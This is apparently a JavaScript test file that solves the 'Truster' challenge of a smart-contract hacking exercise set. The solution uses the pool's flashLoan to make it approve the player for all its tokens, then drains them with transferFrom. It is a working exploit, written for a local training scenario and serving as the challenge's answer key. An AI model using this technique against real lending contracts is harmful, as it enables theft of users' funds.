const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        const abi = ["function approve(address spender, uint256 amount)"];
        const iface = new ethers.utils.Interface(abi);
        const data = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
    
        console.log(`Calling flashLoan...`);
        const tx = await pool.flashLoan(0, player.address, token.address, data);
        await tx.wait(); // Wait for the transaction to be mined

        const allowance = await token.allowance(pool.address, player.address);
        console.log(`Allowance after flashLoan: ${allowance.toString()}`);
        expect(allowance).to.equal(TOKENS_IN_POOL);

        if (allowance.toString() === TOKENS_IN_POOL.toString()) {
        console.log(`Transferring tokens...`);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
        } else {
        console.log(`Allowance not set. Something went wrong.`);
    }




    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

